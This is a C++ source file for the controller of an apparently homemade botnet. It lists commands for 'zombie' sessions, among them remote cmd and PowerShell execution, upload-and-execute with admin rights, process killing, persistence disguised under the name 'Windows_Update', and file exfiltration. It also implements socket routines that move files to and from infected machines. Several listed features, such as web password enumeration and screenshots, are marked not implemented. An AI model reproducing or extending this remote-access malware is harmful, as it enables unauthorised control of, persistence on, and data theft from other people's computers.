#include "Scripts_s.h"

void Info::list_scripts()
{
	print_done("[\t\t------------ List of all scripts ------------");
	print_done("[ You can enter : man <command> for more informations about a command");
	print_done("[	 Man is only for exploit or transfer scripts ");

	print_warning("#------------------------------ Folder action -----------------------------#");

	print_status("[ pwd\t\t\t\t\t: Print the current path");
	print_status("[ ls\t\t\t\t\t: List all files and folders in the current directory");
	print_status("[ getTemp\t\t\t\t\t: Get the location of the temp directory");
	print_status("[ upload \"filename\"\t\t\t\t: Upload a file in the current directory");
	print_status("[ upload_exe \"filename\"\t\t\t: Upload and exe a file in the current directory");
	print_status("[ download \"filename\"\t\t\t: Download a file located in the current directory (you can target an another using cd)");
	print_status("[ download_dir \"filename\"\t\t\t: Download the target directory   ------NOT IMPLEMENTED");

	print_warning("#----------------------------- System commands ----------------------------#");

	print_status("[ cd <directory>\t\t\t\t: Change directory");
	print_status("[ ps\t\t\t\t\t: List all process with their PID and name");
	print_status("[ kill -p <pid>\t\t\t\t: Kill a process by its PID");
	print_status("[ kill -n <name>\t\t\t\t: Kill a process by its name");
	print_status("[ self_persistence <keyname>\t\t: Put a persistence on the payload");
	print_status("[ default name is Windows_Update");
	print_status("[ persistence <file_name> <keyname>\t\t: Put a persistence on a given file in the current directory----NOT IMPLEMENTED");
	print_status("[ default keyname is Windows_Update");
	print_status("[ cmd <command>\t\t\t\t: Run a command using cmd");
	print_status("[ powershell <command>\t\t\t:Run a command using powershell");
	print_status("[ exe_admin <file_name>\t\t\t: Execute a file (.exe) in admin mode");
	print_status("[ exe <file_name>\t\t\t\t: Execute a file");

	print_warning("#-------------------------------- Exploit ----------------------------------#");

	print_status("[ geo\t\t\t\t: Give the localization of the current session------NOT IMPLEMENTED");
	print_status("[ enum_web\t\t\t\t: enum all web passwords on the current session------NOT IMPLEMENTED" );
	print_status("[ screenshot\t\t\t: Take a screenshot from the current target screen------NOT IMPLEMENTED");
	print_status("[ ask <exe> <name>\t\t\t: Upload and execute a given file as administrator with a custom name");
	print_status("[ you can choose a new file_name, default is Windows_Update.exe");

}

void Info::print_help()
{
	print_done("[*] You have now acces to the payload\n");
	print_done("[\t\t------------ List of Commands ------------\t\t]");

	print_status("[ help\t\t\t: list all commands");
	print_status("[ man <command>\t\t: Give more informations about a command");
	print_status("[Man is only for exploit and transfer scripts ");
	print_status("[ list_scripts\t\t: List all scripts available");
	print_status("[ version\t\t\t: Print the current version and changes");
	print_status("[ getcurrentsession\t\t: Print the information about the current session");
	print_status("[ getsysinfo\t\t: Give information about the current session (user ...)");
	print_status("[ getip\t\t\t: Give the External IP address of the current session");
	print_status("[ set_session <nb_session>\t: Switch to an another session");
	print_status("[ list\t\t\t: list all actives sessions");
	print_status("[ mute <nb>\t\t\t: Mute a zombie");
	print_status("[ unmute <nb>\t\t: Unmute a zombie");
	print_status("[ exit_session <number>\t: Exit a given session");
	print_status("[ exit\t\t\t: exit the program");
}

 bool Info::set_session(Server* server,const std::string nb_session)
{
	int nb= atoi(nb_session.c_str());
	std::vector<st_Client> clients = server->getClients();
	if (nb <= clients.size())
	{
		print_status("Switching with session " + nb_session+" ...");
		server->setDefaultClient(clients[nb-1]);
		print_done("Done");
		return 1;
	}
	else
	{
		print_error("Can't find " + nb_session);
		return 0;
	}
}

 void Info::list(Server* server)
{
	print_status("Enuming clients...");
	std::vector<st_Client> clients = server->getClients();
	for (int i = 0; i < clients.size(); i++)
	{
		print_done("Zombie " + std::to_string(clients[i].number) + " Ip : " + clients[i].ip_extern);
	}
}

void Info::version(Server* server)
{
	print_debug("BOTNET version : " + std::string(VERSION));
	print_debug("Last update : " + std::string(UPDATE));
}
void Info::getcurrentsession(Server* server)
{
	print_status("Current session number : " + server->getDefaultClient().number);
	print_status("Connected with : " + server->getDefaultClient().ip_extern);
	
}
#ifdef _WIN32
void SetColor(int value)
{
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), value);
	/*
	1: Blue
	2 : Green
	3 : Cyan
	4 : Red
	5 : Purple
	6 : Yellow(Dark)
	7 : Default white
	8 : Gray / Grey
	9 : Bright blue
	10 : Brigth green
	11 : Bright cyan
	12 : Bright red
	13 : Pink / Magenta
	14 : Yellow
	15 : Bright white
	- Numbers after 15 are background colors -
	*/
}
#endif

void Transfer::uploadToClient(Server* serv1, const unsigned short& nb, const std::string filename)
{
	print_status("Starting the upload of : "+ filename );
	char buffer[BUFFER_LEN] = { 0 };
	std::ifstream file(filename, std::ios::binary | std::ios::in);
	SOCKET cl_sock = serv1->getClient(nb).sock;
	if (file)
	{
		const int len = 1024;
		print_status("Sending data ..");
		const int size = getSize(filename);
		
		print_status(std::to_string(size) + " bytes to send");

		send(cl_sock, std::to_string(size).c_str(), BUFFER_LEN, 0); // SIZE

		int current_size = 0;
		char memblock[len] = { 0 };
		const int rest = size % len;

		std::this_thread::sleep_for(std::chrono::milliseconds(2000));

		int nb = 0;
		file.seekg(0, std::ios::beg);
		bool done = 0;
		int pourcentage = 0;
	//	std::thread t_refresh(refresh, &done,200,&pourcentage);

		while (current_size != size)
		{
			if (current_size+rest==size)
			{
				file.read(memblock, rest);
				send(cl_sock, memblock, rest, 0);
				break;
			}
			else
			{
				file.read(memblock, len);
				send(cl_sock, memblock, len, 0);
				current_size += len;
				file.seekg(current_size, std::ios::beg);
			}
			//pourcentage = current_size * 100;
			//pourcentage = pourcentage / size;
			std::cout << "Boucle " << std::endl;
		}
		done = 1;
		//t_refresh.join();
		print_done("Done");
	}
	else
	{
		send(cl_sock, "STOP", 5, 0);
		print_error("Error can\'t open file : ");
#ifndef _WIN32
		print_error("Error : " + std::string(strerror(errno)));
#endif
	}
}
void Transfer::downloadFromClient(Server* serv1,const unsigned short& nb, const std::string filename)
{	
	char buffer[BUFFER_LEN] = { 0 };
	SOCKET cl_sock = serv1->getClient(nb).sock;
	recv(cl_sock, buffer, BUFFER_LEN, 0); // SIZE

	const unsigned int size = atoi(buffer);
	std::cout << "SIZE : " << size << " buffer : "<< buffer << std::endl;
	print_status(std::to_string(size) + " bytes to download");

	std::ofstream file_export(filename, std::ios::binary | std::ios::out | std::ios::trunc);

	if (file_export)
	{
		print_status("File created");
		print_warning("Starting the download ..");
		const int len = 1024;
		int current_size = 0;
		char memblock[len] = { 0 };
		const int rest = size % len;

		std::this_thread::sleep_for(std::chrono::milliseconds(2000));
		
		int pourcentage = 0;
		bool done = 0;

	//	std::thread t_refresh(refresh, &done, 200, &pourcentage);
		print_status("Please wait until the file is transfered ..");

		while (current_size != size || std::string(memblock) == "STOP")
		{
			if (current_size + rest == size)
			{
				recv(cl_sock, memblock, rest, 0);
				file_export.write(memblock, rest);
				break;
			}
			else
			{
				recv(cl_sock, memblock, len, 0);
				file_export.write(memblock, len);
				current_size += len;
			}
			pourcentage = current_size * 100;
			pourcentage = pourcentage / size;
			std::cout << "Boucle " << std::endl;

		//	print_status(std::to_string(pourcentage) + "%");

		}
		done = 1;
	//	t_refresh.join();
		file_export.close();
		print_done("Done");
		
	}
	else
	{
		print_error("Can't create the file : "+filename);
	}
}

int Transfer::getSize(std::string filename)
{
	std::ifstream file(filename, std::ios::binary);
	if (file)
	{
		std::streampos beg, end;
		beg = file.tellg();
		file.seekg(0, std::ios::end);
		end = file.tellg();
		file.close();
		return (end - beg);
	}
	else
		return 0;

}

void Transfer::recvString(SOCKET cl_sock,const unsigned short nb)
{
	char size_ch[256] = { 0 };
	recv(cl_sock, size_ch, sizeof(size_ch), 0);
	int size = atoi(size_ch);
	int current_size = 0;
	int rest = size % BUFFER_LEN;
	char buffer[BUFFER_LEN] = { 0 };
	print_status("Zombie " + std::to_string(nb)+" :\n");

	while (current_size != size)
	{
		if (current_size + rest == size)
		{
			current_size += rest;
		}
		else
		{
			
			current_size += BUFFER_LEN;

		}
		recv(cl_sock, buffer, BUFFER_LEN, 0);
		print_status(std::string(buffer));
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}
	
}

